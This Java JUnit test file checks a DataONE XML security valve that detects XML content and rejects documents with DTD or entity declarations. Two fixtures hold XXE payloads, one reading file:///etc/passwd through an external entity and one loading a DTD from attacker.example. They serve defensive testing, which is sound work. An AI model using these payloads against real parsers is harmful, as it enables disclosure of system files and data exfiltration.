package org.dataone.security;

import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;

import org.junit.Test;

public class XmlSecurityValidationValveTest {

    private final XmlSecurityValidationValve valve = new XmlSecurityValidationValve();

    @Test
    public void identifiesXmlFromContentType() {
        assertTrue(isXmlType("application/xml", null));
        assertTrue(isXmlType("text/xml; charset=UTF-8", null));
    }

    @Test
    public void identifiesXmlFromFilename() {
        assertTrue(isXmlType("application/octet-stream", "payload.xml"));
    }

    @Test
    public void doesNotIdentifyNonXmlPayload() {
        assertFalse(isXmlType("application/json", "payload.txt"));
    }

    @Test
    public void rejectsXmlWithExternalEntityDeclaration() {
        String maliciousXml =
                "<?xml version=\"1.0\"?>"
                + "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
                + "<root>&xxe;</root>";

        assertTrue(containsForbiddenXmlStructures(streamOf(maliciousXml)));
    }

    @Test
    public void rejectsXmlWithExternalDtdDeclaration() {
        String maliciousXml =
                "<?xml version=\"1.0\"?>"
                + "<!DOCTYPE root SYSTEM \"http://attacker.example/malicious.dtd\">"
                + "<root>ok</root>";

        assertTrue(containsForbiddenXmlStructures(streamOf(maliciousXml)));
    }

    @Test
    public void allowsXmlWithoutDtdOrEntityDeclarations() {
        String safeXml = "<?xml version=\"1.0\"?><root><value>ok</value></root>";
        assertFalse(containsForbiddenXmlStructures(streamOf(safeXml)));
    }

    private boolean isXmlType(String contentType, String fileName) {
        try {
            Method method = XmlSecurityValidationValve.class.getDeclaredMethod("isXmlType", String.class, String.class);
            method.setAccessible(true);
            return (Boolean) method.invoke(valve, contentType, fileName);
        } catch (NoSuchMethodException | IllegalAccessException e) {
            throw new AssertionError("Failed to access XmlSecurityValidationValve.isXmlType", e);
        } catch (InvocationTargetException e) {
            throw new AssertionError("Unexpected exception from XmlSecurityValidationValve.isXmlType", e);
        }
    }

    private boolean containsForbiddenXmlStructures(InputStream xmlStream) {
        try {
            Method method = XmlSecurityValidationValve.class.getDeclaredMethod("containsForbiddenXmlStructures", InputStream.class);
            method.setAccessible(true);
            return (Boolean) method.invoke(valve, xmlStream);
        } catch (NoSuchMethodException | IllegalAccessException e) {
            throw new AssertionError("Failed to access XmlSecurityValidationValve.containsForbiddenXmlStructures", e);
        } catch (InvocationTargetException e) {
            throw new AssertionError("Unexpected exception from XmlSecurityValidationValve.containsForbiddenXmlStructures", e);
        }
    }

    private InputStream streamOf(String value) {
        return new ByteArrayInputStream(value.getBytes(StandardCharsets.UTF_8));
    }
}
